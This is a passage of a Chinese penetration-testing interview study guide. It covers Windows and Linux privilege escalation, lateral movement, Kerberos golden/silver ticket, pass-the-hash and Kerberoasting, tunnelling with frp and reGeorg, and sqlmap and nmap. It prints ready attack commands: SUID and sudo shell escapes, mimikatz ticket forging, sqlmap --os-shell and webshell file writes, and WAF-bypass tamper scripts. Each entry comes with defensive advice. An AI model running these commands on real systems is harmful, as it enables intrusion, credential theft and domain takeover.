| 售卖数据 | 《刑法》第 253 条之一 + 情节严重可判 7 年 |
| 跨境数据窃取 | 《数据安全法》第 46 条 + 危害国家安全 |

**6. SRC 漏洞挖掘的边界**：

**授权范围**：SRC 平台公布的资产清单（IP、域名、URL）。
**禁止行为**：
- 不要 DoS 攻击
- 不要尝试拖库（即使是漏洞可拖）
- 不要访问超出 SRC 范围的系统（即使在同一网段）
- 不要将漏洞细节公开发布
- 不要将漏洞用于勒索/威胁厂商

**正确流程**：
1. 在 SRC 平台提交漏洞（详细复现步骤、危害）。
2. 等待厂商确认（通常 3-7 个工作日）。
3. 修复后确认 + 给奖励 + 公开发布致谢（部分平台）。

**7. 红队测试的额外合规**：

- **授权时间**：必须在合同约定时间内。
- **破坏性测试**：DoS/DDoS 测试需要**额外**明确授权。
- **社工钓鱼**：需要在合同中**额外**约定（钓鱼对象、邮件内容）。
- **物理测试**：需要现场授权书 + 物业配合。
- **无线测试**：需要明确 SSID/频段授权。
- **0day 使用**：需评估风险，可能不允许使用未公开 0day。

**8. 面试答题模板**：

> "渗透测试必须在**书面授权**的**明确范围**内进行，未经授权的测试可能违反《网络安全法》《数据安全法》《刑法》285/286 条。
> 实际操作中，我会按 **前期授权 → 中期合规 → 后期清理** 三阶段执行，所有动作记录日志，发现高危立即通报。
> 护网中红队不触碰非靶标系统，蓝队不主动反制攻击者（除非授权），双方都保护证据保全现场。"

**解析**：

考察意图：考察安全合规意识与法律底线。回答要点：授权流程 + 法律条款 + 操作清单 + 常见违法场景。易错点：只说"必须有授权"不提具体法律条款。面试官想听到：能讲清《网安法》第 27/28/76 条、《刑法》第 285/286 条、明白"未授权扫描"也是违法、了解护网合规的"不触碰非靶标"纪律。

**考察知识点**：
- 授权三阶段（前期/中期/后期）
- 《网络安全法》《数据安全法》《刑法》关键条款
- 护网合规（红队不触碰非靶标 + 蓝队不主动反制）
- SRC 漏洞挖掘边界
- 常见违法场景与后果

### 第 21 天（精讲） ★★★★★ Windows 提权方法


**主题**：操作系统与提权 / Windows

**答案**：

Windows 提权方法分为纵向（低权限 → 高权限）和横向（同级别）：

**1. 内核溢出漏洞提权（最常用）**：
- 辅助工具：Windows-Exploit-Suggester、wesng
- MSF 模块：`post/multi/recon/local_exploit_suggester`
- 经典 CVE：
  - CVE-2018-8120：Win7 / Win Server 2012 提权
  - CVE-2019-1388：UAC 对话框提权（Win7 / 2008）
  - CVE-2020-0787：BackgroundCopyManager 任意位读取
  - CVE-2021-1675 / CVE-2021-34527 PrintNightmare：Print Spooler 远程代码执行
- 提权流程：`systeminfo` 查看补丁 → 对比 KB 找未打补丁 → 利用对应 exp

**2. 数据库提权**：
- MSSQL：sa 权限下 xp_cmdshell 执行命令
- MySQL UDF（详见数据库安全题）
- Oracle：Java 存储过程提权

**3. 系统配置错误**：
- AlwaysInstallElevated：开启后任何用户可 msi 安装提权
- 弱口令 / 默认口令
- Trusted Service Paths：服务路径未引号 + 空格
- Unquoted Service Path 漏洞利用

**4. 组策略首选项 GPP 提权**：
- SYSVOL 共享中 cpassword 字段 AES 加密（密钥公开）
- 获取 cpassword 解密得到管理员密码
- 防御：KB2962486 补丁或删除旧 GPO

**5. DLL 劫持提权**：
- 应用加载 DLL 搜索顺序：应用目录 → 系统目录 → PATH
- 上传恶意 DLL 到应用目录
- 白加黑绕过杀软

**6. 令牌窃取**：
- incognito 模块列举令牌 `list_tokens -u`
- `impersonate_token` 模拟域管
- 需要 SYSTEM 权限下操作

**7. 第三方软件提权**：
- 搜狗输入法提权
- 向日葵 / TeamViewer 客户端提权
- 各类未打补丁软件

**防御**：
- 及时打补丁（WSUS / SCCM）
- 关闭高危服务（Print Spooler）
- 最小权限原则
- LSA 保护（PPL）

**解析**：

考察意图：操作系统层面提权的全面性。回答要点：分纵向/横向+多个维度。易错点：只提内核提权忽视其他维度。面试官想听到：能详细说明 AlwaysInstallElevated 配置点（注册表 HKLM/HKCU）、PrintNightmare 禁用方法（服务停止）、令牌窃取原理（模拟登录会话而非密码破解）。

**考察知识点**：

- 内核 exp 对应未打补丁
- AlwaysInstallElevated 配置
- GPP cpassword 漏洞
- DLL 劫持白加黑

---


---

### 第 22 天（精讲） ★★★★★ Linux 提权方法


**主题**：操作系统与提权 / Linux

**答案**：

Linux 提权思路：低权限用户 → 获取 root 权限。

**1. 内核漏洞提权（最经典）**：
- **Dirty COW（CVE-2016-5195）**：
  - 内核竞争条件漏洞，普通用户可写只读文件
  - 改写 `/etc/passwd` 给 root 空口令
  - 影响 Linux 2.6-4.7，影响范围极广
  - 工具：dirtycow / dcow
- **DirtyPipe（CVE-2022-0847）**：
  - 5.8-5.16.11 内核，过滤器覆盖只读文件
  - 改写 SUID 二进制注入代码
- 其他：
  - CVE-2021-3156（Baron Samedit）：sudo 堆溢出
  - CVE-2021-4034（Polkit pkexec）：PwnKit
  - CVE-2022-2588（nft_object_init）：netfilter UAF

**2. SUID 提权**：
- 查找命令：`find / -perm -u=s -type f 2>/dev/null`
- GTFOBins 查询可利用 SUID 命令：find / vim / nmap / python / bash / less / more
- 示例：
  - `find . -exec whoami \;`
  - `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
  - `vim -c ':!bash'`

**3. Sudoer 配置错误**：
- `sudo -l` 查看可执行命令
- 常见错误：`(ALL) NOPASSWD: /usr/bin/vim`
- 利用方式：`sudo vim → :!bash` 获得 root
- CVE-2021-3156：sudoedit 任意文件覆盖

**4. Crontab 定时任务**：
- `/etc/crontab` + `crontab -l` 查看
- 路径错误或脚本可写：
  - 脚本 `chmod +w` 可写任意命令反弹
  - 路径错误导致执行伪造命令
- 通配符+tar/rsync 反弹：`tar cf /backup/* shell.sh`（注入 `--checkpoint`）

**5. PATH 环境变量劫持**：
- SUID 程序调用其他命令时仅写相对路径
- 修改 PATH 指向自制恶意命令

**6. Capabilities 滥用**：
- `getcap -r / 2>/dev/null`
- `cap_dac_read_search`：可读取任意文件
- `cap_setuid` + python：`os.setuid(0)`

**7. NFS 提权**：
- `no_root_squash` 配置下，挂载 NFS 目录以 root 权限运行

**8. passwd/shadow 可写**：
- 直接修改 shadow 添加 root 空口令

**防御**：
- 及时升级内核
- 最小 SUID 数量
- 严格 sudoer 配置
- 监控异常命令

**解析**：

考察意图：Linux 环境必问。回答要点：要分类展示各类提权方法。易错点：只提 SUID 忽视其他维度。面试官想听到：能讲清 Dirty COW 原理（mmap COW 竞争）、tar `--checkpoint` 反弹技巧（高频 HW 手法）、GTFOBins 项目的作用（运维漏洞利用速查）。

**考察知识点**：

- Dirty COW / DirtyPipe 内核漏洞
- SUID GTFOBins 利用
- crontab 通配符 + tar 反弹
- Capabilities 滥用

---


---

### 第 23 天（精讲） ★★★★ 内网横向移动的常用方法


**主题**：内网与域渗透 / 横向移动

**答案**：

内网横向移动（Lateral Movement）是从一台已控主机扩展到其他主机的过程：

**Windows 横向移动方法**：

**1. PsExec（微软官方）**：
- 通过 SMB 上传服务 + 远程创建
- `psexec.exe \\target -u user -p pass -s cmd`
- `PsExec.exe -accepteula -s cmd`（SYSTEM 权限）
- 痕迹：日志 4624/7045

**2. WMI（Windows Management Instrumentation）**：
- `wmic /node:target /user:user /password:pass process call create "cmd"`
- 无文件落地，仅有日志
- 工具：impacket `wmiexec.py`

**3. WinRM（Windows Remote Management）**：
- 5985 HTTP / 5986 HTTPS
- `Invoke-Command -ComputerName target -ScriptBlock {cmd}`
- `winrs -r:target cmd`

**4. DCOM（Distributed COM）**：
- 通过 MMC20.Application 远程执行
- impacket `dcomexec.py`

**5. RDP（远程桌面）**：
- `mstsc /v:target /admin`
- 桌面级操作
- 3389 端口需开启

**6. SMB（Server Message Block）**：
- `net use \\target\ipc$ pass /u:user`
- `copy file \\target\c$`

**7. WMI + PowerShell**：
- Invoke-WmiMethod + Win32_Process Create
- 无需落地 exe

**8. 计划任务**：
- `schtasks /s target /create /tn name /tr cmd /sc once /st time`

**9. Pass-the-Hash / Ticket**：
- 用已抓取的凭证访问其他主机

**Linux 横向移动**：
- SSH 公私钥（已控 `.ssh/id_rsa`）
- 密码复用爆破（同一密码多个主机）
- 漏洞利用（如 Hadoop Yarn 未授权、Hadoop RCE）
- Samba/FTP 协议

**代理穿透工具**：
- frp / nps：SOCKS5 反向代理
- EarthWorm（EW）：正向 + 反向代理
- chisel：基于 WebSocket 的隧道
- iox：端口转发
- msf socks4a 模块

**检测与防御**：
- 监控异常 RDP/PSExec/WMI 日志
- 限制管理员登录主机数量
- 启用 Windows Defender Credential Guard
- 网络 ACL 限制横向流量

**解析**：

考察意图：内网实战能力必问。回答要点：分类展示多种方法。易错点：只提 PSExec 忽视其他方法。面试官想听到：能讲清 WMI 无文件执行的隐蔽性（仅日志）、WinRM 相比 PsExec 的优势（5985 端口更易通过防火墙）、PsExec 会在目标主机创建服务留下 7045 事件日志。

**考察知识点**：

- PsExec / WMI / WinRM 横向
- SOCKS 代理穿透 frp / nps
- 无文件 WMI 执行
- 异常日志监控 4624/7045

---


---

### 第 24 天（精讲） ★★★★★ Kerberos 认证流程与常见攻击


**主题**：内网与域渗透 / Kerberos

**答案**：

Kerberos 是 Windows AD 域的核心认证协议：

**认证流程**：
1. **AS_REQ**（Authentication Service Request）：客户端向 KDC 的 AS 服务发送认证请求，包含客户端身份、预认证时间戳（用 NTLM Hash 加密）
2. **AS_REP**（Authentication Service Response）：KDC 验证预认证后，颁发 TGT（Ticket Granting Ticket），TGT 用 krbtgt 账号密钥加密，内含 PAC（特权属性证书），返回 TGT + 会话密钥（用客户端 NTLM Hash 加密）
3. **TGS_REQ**（TGS Request）：客户端访问某服务时，向 KDC 的 TGS 服务发送 TGT + SPN，请求服务票据 ST（Service Ticket）
4. **TGS_REP**（TGS Response）：KDC 返回 ST 服务票据（用服务账号密钥加密），客户端用会话密钥解密获得服务会话密钥
5. **AP_REQ**（Application Request）：客户端向服务端发送 ST + 会话密钥，服务端用自己密钥解密 ST 验证
6. **AP_REP**（可选）：服务端响应证明

**关键概念**：
- KDC = AS（认证服务）+ TGS（票据授予服务）
- 长期密钥（用户密码 Hash）+ 短期会话密钥
- PAC（Privilege Attribute Certificate）：包含用户 SID 和组成员关系

**常见攻击**：
1. Kerberoasting（详见后续题目）
2. AS-REP Roasting：预认证关闭账户的 Hash 爆破
3. Pass-the-Ticket：导出票据文件重放
4. Golden Ticket（黄金票据）：伪造 TGT
5. Silver Ticket（白银票据）：伪造 ST

**解析**：

考察意图：域渗透核心知识。回答要点：要分清 AS/TGS 阶段和票据类型。易错点：把 NTLM 和 Kerberos 混淆。面试官想听到：能详细解释 PAC（特权属性证书）作用（包含用户组信息用于授权）、SPN（服务主体名称）在 Kerberoasting 中的关键作用、不同攻击针对不同票据（TGT/ST）。

**考察知识点**：

- AS_REQ / AS_REP / TGS_REQ / TGS_REP / AP_REQ
- TGT 黄金票据 / ST 服务票据
- KDC = AS + TGS
- PAC 特权属性证书

---


---

### 第 25 天（精讲） ★★★★★ 黄金票据与白银票据攻击


**主题**：内网与域渗透 / 票据攻击

**答案**：

Kerberos 票据伪造是域渗透的高级技术，绕过认证直接获得服务访问权：

**黄金票据（Golden Ticket）攻击**：
- 目标：伪造 TGT 票据
- 必要条件：krbtgt 账号的 NTLM Hash（或 AES256/RC4 密钥）
- 攻击流程：
  1. 利用 DCSync 或 dumpsam 获取 krbtgt Hash
  2. mimikatz 执行：
     ```
     kerberos::golden /user:Administrator /domain:xxx.com /sid:S-1-5-21-... /krbtgt:hash /ptt
     ```
  3. 获得任意用户身份的 TGT，可访问域内所有服务
- 危害：完全控制域，访问任意服务，绕过 KDC 验证
- 防御：
  - 定期修改 krbtgt 密码（每 30-90 天）
  - 双改密码（新旧密码同时改避免旧票据生效）
  - 启用 Credential Guard
  - 检测异常 TGT 请求模式

**白银票据（Silver Ticket）攻击**：
- 目标：伪造 ST 服务票据
- 必要条件：目标服务账号的 NTLM Hash
- 攻击流程：
  1. 获取某服务账号 Hash（如 MSSQLSvc / CIFS / HOST 等 SPN 对应账号）
  2. mimikatz 执行：
     ```
     kerberos::silver /service:cifs/dc01.domain.com /domain:domain.com /target:dc01.domain.com /rc4:hash /ptt
     ```
  3. 仅访问该特定服务
- 优势：不需要 TGS 交互，不与 KDC 通信，更隐蔽
- 劣势：仅针对单一服务，无法跨服务访问
- 防御：
  - 启用 PAC 验证（KB3011780）
  - 服务账号使用强密码
  - 最小化服务账号权限

**对比**：

| 维度 | 黄金票据 | 白银票据 |
|------|---------|---------|
| 票据 | TGT | ST |
| Hash | krbtgt | 服务账号 |
| 范围 | 全域 | 单服务 |
| 检测 | KDC 日志 | 难检测 |

常用工具：mimikatz、kekeo、impacket。

**解析**：

考察意图：域渗透高级问题，面试加分项。回答要点：要分清 TGT/ST+Hash 类型+攻击范围。易错点：混淆两者或忽视必要条件。面试官想听到：能详细说明 mimikatz 命令参数（/user /domain /sid /krbtgt）、为什么白银票据更隐蔽（不与 KDC 通信）、双改 krbtgt 密码的原理（旧 TGT 失效需新密码）。

**考察知识点**：

- 黄金票据=伪造 TGT / 白银票据=伪造 ST
- mimikatz `kerberos::golden` / `silver`
- krbtgt 双改密码防御
- PAC 验证防白银票据

---


---

### 第 26 天（精讲） ★★★★★ Pass-the-Hash 与 Kerberoasting 攻击


**主题**：内网与域渗透 / 域攻击

**答案**：

**Pass-the-Hash（哈希传递）**：
- 原理：NTLM 认证只需 NTLM Hash，无需明文密码
- 工具：mimikatz `sekurlsa::pth`
  - 示例：`sekurlsa::pth /user:admin /domain:domain /ntlm:hash`
- 攻击流程：
  1. 从已控主机导出 NTLM Hash（mimikatz `sekurlsa::logonpasswords`）
  2. 用 Hash 模拟用户身份登录其他主机
  3. 适用于 NTLM 认证（Windows 本地认证、IPC、PSExec）
- 局限：Kerberos 认证需要 TGT，不能直接用 Hash
- 防御：
  - 强制 Kerberos 认证
  - 启用 LSA Protection（PPL）
  - 关闭 NTLM 认证

**Kerberoasting（SPN 凭证爆破）**：
- 原理：任何域用户可请求 SPN 关联服务账号的 TGS 票据，离线爆破服务账号密码
- 攻击流程：
  1. 枚举域内 SPN：`setspn -Q */*` 或 `GetUserSPNs.py`
  2. 请求 TGS 票据：`GetUserSPNs.py domain.com/user:pass -request`
  3. 离线爆破：`hashcat -m 13100 hash.txt wordlist.txt` 或 john
- 目标：服务账号（如 MSSQLSvc / Http / HOST 等）
- 危害：拿到服务账号 = 横向到运行该服务的所有主机
- 防御：
  - 服务账号使用长强密码（25 位以上）
  - 减小服务账号权限（不授予 Domain Admin）
  - AES256 加密 TGS（不易爆破）
  - 监控异常 TGS 请求模式

**DCSync 攻击**：
- 原理：利用 DRSUAPI 协议从域控同步账号凭证
- 必要条件：账户具有 Replicating Directory Changes 权限（默认 Domain Admin / Enterprise Admin / Administrators 组成员）
- 工具：`secretsdump.py domain.com/admin:pass@dc01`
- 危害：导出 krbtgt Hash → 黄金票据 → 控全域
- 防御：
  - ACL 审计（谁有 Replicating Directory Changes 权限）
  - 最小权限原则
  - 监控异常 DCSync 请求

**解析**：

考察意图：域渗透三大核心攻击必问。回答要点：要分清各自攻击对象+必要条件+防御。易错点：把 PtH 和 PtT 混淆，或忽视 Kerberoasting 的"任意域用户"前提（意味着即使低权限账户也能利用）。面试官想听到：能详细说明 hashcat -m 13100 爆破 Kerberos 5 TGS-REP、mimikatz sekurlsa 模块的原理、PPL 保护如何阻止哈希提取。

**考察知识点**：

- PtH 用 NTLM Hash
- Kerberoasting 爆 SPN 服务账号
- DCSync 同步 krbtgt Hash
- mimikatz sekurlsa + hashcat 爆破

---


---

### 第 27 天（精讲） 内网穿透
**主题**：渗透测试 / 内网渗透 / 网络穿透

**答案**：

内网穿透解决"内网服务无公网 IP / 目标只出网 / 防火墙阻挡入站"三大场景。

**1. 穿透原理**：

**传统反向隧道**：
- 内网主机主动连公网中转节点（VPS/C2）
- 中转节点建立监听
- 公网访问中转节点即被转发到内网

**P2P 打洞（UDP 穿透）**：
- 通过 STUN/TURN/ICE 协议建立 NAT 穿透
- 双方直接通信，无需中转（延迟低）
- 成功率受 NAT 类型影响

**2. 主流工具**：

| 工具 | 协议 | 特点 | 场景 |
|------|------|------|------|
| **frp** | TCP/UDP/HTTP/HTTPS | 配置简单、性能强、活跃维护 | 通用首选 |
| **nps** | TCP/UDP/HTTP/HTTPS | Web 管理界面、插件化 | 多用户管理 |
| **ngrok** | HTTP/HTTPS/TCP | 国外著名、有免费版 | 临时公网映射 |
| **reGeorg** | HTTP | 把 HTTP 变成 TCP 隧道 | 仅出网 HTTP 80/443 场景 |
| **EarthWorm（ew）** | HTTP/HTTPS/TCP/UDP | 老牌、跨平台 | 老旧环境 |
| **SSH 反向隧道** | TCP | 系统自带、无需额外工具 | 临时用 |
| **Cobalt Strike** | SMB/TCP/HTTP/HTTPS/DNS | C2 隧道、隐蔽 | 护网红队 |
| **chisel** | TCP | Go 编写、单文件 | 现代替代 ew |
| **ligolo-ng** | TCP | 双向隧道、性能强 | 现代高级穿透 |

**3. frp 配置详解**（最常用）：

**服务端（公网 VPS）**：
```ini
# frps.ini
[common]
bind_port = 7000           # 客户端连接端口
dashboard_port = 7500      # Web 管理界面
dashboard_user = admin
dashboard_pwd = password
token = your_secure_token  # 认证令牌
```

```bash
./frps -c frps.ini
```

**客户端（内网主机）**：
```ini
# frpc.ini
[common]
server_addr = vps_ip
server_port = 7000
token = your_secure_token

# 1. SSH 远程桌面
[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6000   # 公网访问 vps_ip:6000 即转发到内网 22

# 2. RDP（Windows 远程桌面）
[rdp]
type = tcp
local_ip = 127.0.0.1
local_port = 3389
remote_port = 3389

# 3. HTTP 服务（内网 web）
[web]
type = http
local_port = 80
custom_domains = internal.example.com

# 4. HTTPS 服务
[web_https]
type = https
local_port = 443
custom_domains = internal.example.com
plugin = https2http
plugin_local_addr = 127.0.0.1:80

# 5. SOCKS5 代理（内网全流量代理）
[socks5]
type = tcp
remote_port = 1080
plugin = socks5
plugin_user = user
plugin_passwd = pass
```

**4. SSH 反向隧道**（免装工具）：

```bash
# 1. 在内网主机上执行（建立反向隧道）
ssh -R 6000:localhost:22 user@vps_ip

# 2. 在 VPS 上访问
ssh -p 6000 user@localhost

# 3. 持续保持（autossh）
autossh -M 20000 -R 6000:localhost:22 user@vps_ip -N
```

**5. reGeorg**（仅 HTTP 出网）：

```bash
# 1. 上传 reGeorg 脚本到内网 web 服务器
# tunnel.jsp / tunnel.aspx / tunnel.php

# 2. 启动客户端
python reGeorgSocksProxy.py -p 1080 -u http://internal/tunnel.php

# 3. 配置 proxychains
# proxychains.conf 中添加 socks5 127.0.0.1 1080

# 4. 通过代理访问内网
proxychains nmap -sT -p 22,80,3389 192.168.1.0/24
```

**6. 隐蔽流量（护网红队必备）**：

**域前置**（Domain Fronting）：
- 利用 CDN（Cloudflare/Azure）合法域名做 TLS SNI
- 真实 C2 隐藏在 CDN 后
- HTTPS 流量看是访问合法域名（如 `cdn.cloudflare.com`）

**Malleable C2 Profile**（Cobalt Strike）：
- 自定义 HTTP/HTTPS 流量画像
- 模仿合法请求（jQuery 请求、Google Analytics 等）
- 加密 + jitter（心跳随机化）

**DNS 隧道**：
- `iodine`、`dnscat2`、`dns2tcp`
- 数据走 DNS 53 端口
- 适合几乎所有防火墙都允许 DNS 53 出网的场景

**7. 内网穿透的检测与防御**：

**蓝队检测**：
- 异常出站连接（IP 地域异常 + 端口异常）
- 长期小流量心跳（CS/beacon 特征）
- frp 默认端口 7000/7500 监控
- DNS 隧道特征（异常长域名、TXT 记录大量数据）
- EDR 行为告警（非常规进程派生）

**蓝队阻断**：
- 防火墙规则限制出站（仅允许必要业务）
- 主动探测可疑 C2 IP（威胁情报）
- DNS 白名单（仅允许指定 DNS 解析）
- 流量镜像分析（NetFlow/sFlow）

**8. 实战选择**：

| 场景 | 推荐工具 |
|------|---------|
| SSH/RDP/任意 TCP | frp + tcp |
| 内网 HTTP 服务 | frp + http |
| 仅 HTTP 出网 | reGeorg/chisel |
| 需要 SOCKS5 全流量代理 | frp + socks5 + proxychains |
| 隐蔽要求高 | Cobalt Strike + Malleable C2 + 域前置 |
| 几乎所有网络都能出 DNS | iodine + dnscat2 |
| 不想装工具 | SSH 反向隧道 + autossh |

**解析**：

考察意图：考察内网穿透的实战能力。回答要点：分类列工具 + 至少掌握一种工具的配置 + 隐蔽性方案。易错点：只说"frp"不讲原理与隐蔽。面试官想听到：能讲清"反向隧道"原理、知道 reGeorg 在 HTTP-only 场景的价值、了解 C2 域前置与 Malleable C2 隐蔽手段、明白 DNS 隧道是最后保底方案。

**考察知识点**：
- 内网穿透原理（反向隧道 / P2P 打洞）
- 主流工具对比（frp/nps/ngrok/reGeorg/SSH/Cobalt Strike）
- frp 5 种典型配置（SSH/RDP/HTTP/SOCKS5/HTTPS）
- 隐蔽流量（域前置 + Malleable C2 + DNS 隧道）
- 蓝队检测与阻断策略

### 第 28 天（精讲） ★★★★ Burp Suite 核心模块与使用技巧


**主题**：工具使用 / Burp Suite

**答案**：

Burp Suite 是 Web 渗透测试的事实标准工具（PortSwigger）：

**核心模块**：

**1. Proxy（代理）**：
- 默认监听 127.0.0.1:8080
- 浏览器设置代理拦截 HTTP/HTTPS 请求
- 可修改请求/响应内容
- HTTPS 需安装 CA 证书
- Match and Replace 规则自动替换
- Drop / Drop all 快速丢弃

**2. Repeater（重放器）**：
- 手动修改请求并重发
- 验证漏洞可重现性
- 逐步调整参数观察响应
- 必备工具

**3. Intruder（爆破/枚举）**：
- 四种攻击类型：
  - **Sniper**：单 payload 替换单一位置
  - **Battering ram**：多位置用同一 payload
  - **Pitchfork**：多位置用不同 payload 集（组合）
  - **Cluster bomb**：多位置笛卡尔积
- 应用：爆破密码 / Token / 验证码绕过
- 自定义 payload：字典/正则/数字/字符

**4. Scanner（主动扫描）**：
- Pro 版本独有
- 被动 + 主动漏洞扫描
- 报告输出

**5. Spider（爬虫）**：
- 自动爬取 Web 站点
- 发现隐藏内容
- 配合 scope 控制范围

**6. Decoder（编解码）**：
- URL / HTML / Base64 / Hex 编码解码
- 支持哈希计算

**7. Comparer（差异比较）**：
- 比较两个响应的差异
- 定位关键参数影响

**8. Sequencer（会话分析）**：
- 分析 Token / 随机数熵
- 检测可预测的会话 ID

**9. Logger（请求日志）**：
- 全量记录所有请求
- 过滤搜索

**实用技巧**：
1. 拦截 HTTP 请求：Forward 放行 / Drop 丢弃，Action 发送到 Repeater / Intruder / Comparer
2. 配合插件（BApp Store）：
   - Logger++：增强日志
   - Autorize：自动越权检测（垂直越权）
   - HackBar：辅助 payload
   - JSON Beautifier：JSON 格式化
   - Wsdler：WSDL 解析
   - Copy as Python Requests：复制为 Python 代码
3. 移动 APP 测试：Proxy 设置手机 Wi-Fi 代理 + 安装 CA 证书
4. HTTPS 证书安装：访问 http://burp 下载证书，浏览器/手机安装为受信任根证书
5. 被动扫描：浏览站点自动分析请求，不主动发送 payload
6. Scope 限定：Target → Scope 限定测试范围
7. Turbo Intruder（扩展）：高并发爆破，适用于 race condition

**桌面版 vs 社区版**：
- Community：基础功能（Proxy / Repeater / Decoder / Comparer）
- Professional：+Scanner / 无限 Intruder 速度 / Save project

**常见操作流程**：
1. 配置浏览器代理 → 拦截请求
2. 正常浏览 → Spider 爬取
3. 右键 Send to Repeater → 手动测试
4. 漏洞点 Send to Intruder → 爆破
5. Scanner 主动扫描（Pro）

**解析**：

考察意图：Burp 是 Web 测试标配，必问工具。回答要点：要展示完整工作流 + Intruder 四种攻击类型。易错点：不知道 Intruder 四种攻击类型差异。面试官想听到：能详细解释四种 Intruder 攻击（Sniper 单点/Battering ram 同步/Pitchfork 一一对应/Cluster bomb 笛卡尔积）的应用场景、Autorize 插件如何自动检测越权、HTTPS 抓包原理（中间人 CA 证书）。

**考察知识点**：

- Proxy / Repeater / Intruder 四大模块
- Intruder Sniper / Pitchfork / Cluster Bomb
- Autorize 越权检测插件
- HTTPS CA 证书安装

---


---

### 第 29 天（精讲） ★★★ Sqlmap 高级用法与 Tamper 脚本编写


**主题**：工具使用 / Sqlmap

**答案**：

Sqlmap 是 SQL 注入自动化标杆工具，github star 30K+，覆盖 Mysql / Oracle / MSSQL / PostgreSQL / SQLite / Access 等。

**1. 基础使用**：
```bash
sqlmap -u 'http://target.com/news?id=1'
sqlmap -u 'http://target.com/news?id=1' --dbs    # 库
sqlmap -u 'http://target.com/news?id=1' -D test --tables   # 表
sqlmap -u 'http://target.com/news?id=1' -D test -T users --columns  # 字段
sqlmap -u 'http://target.com/news?id=1' -D test -T users -C name,pwd --dump  # 数据
```

**2. 高级注入模式**：
- `--level=5 --risk=3`（最高检测强度，包含所有 payload）
- `--technique=BEUSTQ`（B 布尔/E 报错/U 联合/S 栈注/T 时间/Q 内联）
- `--tamper=space2comment,randomcase`（绕过 WAF）
- `--dbms=mysql`（指定数据库加速）
- `--os-shell`（WebShell，需 dba 权限 + secure_file_priv 空）
- `--os-cmd=whoami`（单命令）
- `--file-read=/etc/passwd`（读文件）
- `--file-write=evil.txt --file-dest=/var/www/html/evil.php`（写文件）
- `--proxy=http://127.0.0.1:8080`（Burp 代理）
- `--random-agent`（UA 随机）
- `--batch`（默认选项自动确认）

**3. POST 注入**：
```bash
sqlmap -u 'http://target.com/login' --data 'username=admin&password=admin'
```

**4. Cookie 注入**：
```bash
sqlmap -u 'http://target.com/' --cookie 'id=1*' --level 2
```

**5. Tamper 脚本编写（自定义 WAF 绕过）**：
tamper 脚本位于 `sqlmap/tamper/`，每个是一个 Python 文件，提供 `def tamper(payload, **kwargs)` 函数。

示例：把空格替换为 `/**/`
```python
#!/usr/bin/env python
from lib.core.compat import xrange
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL
def dependencies(): pass
def tamper(payload, **kwargs):
    return payload.replace(' ', '/**/') if payload else payload
```

示例：双写绕过（过滤 union → uniunionon 再去除）：
```python
def tamper(payload, **kwargs):
    keywords = ('union','select','and','or','from','where')
    for kw in keywords:
        payload = payload.replace(kw, kw[0]+'/'+'*/'+kw[1:])
    return payload
```

**6. 性能优化**：
- `--threads=10`（并发，默认 1）
- `--timeout=10`（超时）
- `--retries=3`（重试）
- `--predict-output`（基于字典预测）
- `--compression`（压缩请求）
- `--live-test`（边跑边输出）

**7. 自动化**：
- sqlmap 批量 URL：`sqlmap -m urls.txt`
- 配合 Burp：右键 "Save items" 导出 XML → `sqlmap -l log.xml`
- 配合爬虫：`--crawl=2`（爬取 2 层链接）

**8. 输出与日志**：
- `-t /tmp/sqlmap.log`
- 输出位置：`/root/.local/share/sqlmap/output/target.com/`

**9. 反制 sqlmap（WAF 识别）**：
- 识别 sqlmap：User-Agent 含 sqlmap、特征请求头、payload 特征
- 反制：动态蜜罐、js 挑战、行为分析

**面试常见追问**：
- tamper 编写思路？答：分析 WAF 日志看过滤什么，等价替换
- sqlmap 如何识别注入点？答：基于报错+布尔+时间三种基准判断
- sqlmap 如何读取本地文件？答：LOAD_FILE() 函数，需 FILE 权限和 secure_file_priv 空

**解析**：

考察意图：Sqlmap 是日常核心工具。回答要点：高级参数 + tamper 编写原理。易错点：只懂 -u 不懂 tamper 编写。面试官想听到：能讲清 tamper 函数签名（`def tamper(payload,**kwargs)`）、os-shell 条件（dba+FILE）、post/cookie 注入参数。

**考察知识点**：

- `--os-shell` 条件
- tamper 脚本编写
- post / cookie 注入
- `--level` 与 `--risk`

---


---

### 第 30 天（精讲） ★★★★ Nmap 常用扫描方式与脚本引擎


**主题**：工具使用 / Nmap

**答案**：

Nmap（Network Mapper）是渗透测试必备的网络扫描工具：

**主机发现**：
- `-sP`：仅 PING 扫描
- `-Pn`：跳过 PING，假设所有主机在线
- `-PS/PA/PU`：SYN/ACK/UDP PING

**端口扫描**：
- `-sS`：SYN 半开扫描（默认，推荐，不完成三次握手，速度快+隐蔽）
- `-sT`：TCP 全连接扫描（需完成三次握手，会被记录）
- `-sU`：UDP 扫描（慢，因 UDP 无连接确认）
- `-sA`：ACK 扫描（探测防火墙规则，区分 filtered/unfiltered）
- `-sF/-sX/-sN`：FIN/Xmas/Null 扫描（利用 RFC 793 漏洞，绕过无状态防火墙）
- `-sM`：Maimon 扫描
- `-sW`：Window 扫描
- `-sI`：Idle 扫描（僵尸扫描，完全隐蔽）

**端口选项**：
- `-p 80`：单端口
- `-p 1-65535`：全端口
- `-p 80,443,8080`：多端口
- `-p http,https`：服务名
- `--top-ports 100`：最常用的 100 端口
- `-F`：快速扫描（100 个常见端口）

**服务/版本探测**：
- `-sV`：版本探测
- `--version-intensity 0-9`：探测强度
- `--version-light`：轻量级（强度 2）

**操作系统探测**：
- `-O`：操作系统识别（基于 TCP/IP 协议栈指纹）
- `--osscan-limit`：限制探测目标

**脚本引擎 NSE（Lua 脚本）**：
- `--script=default`：默认脚本
- `--script=vuln`：漏洞扫描
- `--script=exploit`：漏洞利用
- `--script=auth`：认证扫描
- `--script=brute`：暴力破解
- `--script=http-enum`：枚举 Web 目录
- `--script=smb-vuln-ms17-010`：检测永恒之蓝
- `--script=mysql-info`：MySQL 信息
- `--script=redis-info`：Redis 信息
- `--script=*smb*vuln*`：SMB 漏洞检测
- `--script=http-title`：HTTP 标题
- `--script=ssl-cert`：SSL 证书

**脚本分类（14 类）**：auth、broadcast、brute、default、discovery、dos、exploit、external、fuzzer、intrusive、malware、safe、version、vuln

**性能优化**：
- `-T 0-5`：时序模板（0=慢/隐蔽，5=快/嘈杂）
  - `-T4`：激进扫描（推荐内网）
  - `-T2`：礼貌扫描（避免 IDS 告警）
- `--max-retries`：重试次数
- `--min-rate/--max-rate`：包速率
- `--min-parallelism/--max-parallelism`：并发数

**输出格式**：
- `-oN normal.txt`：普通输出
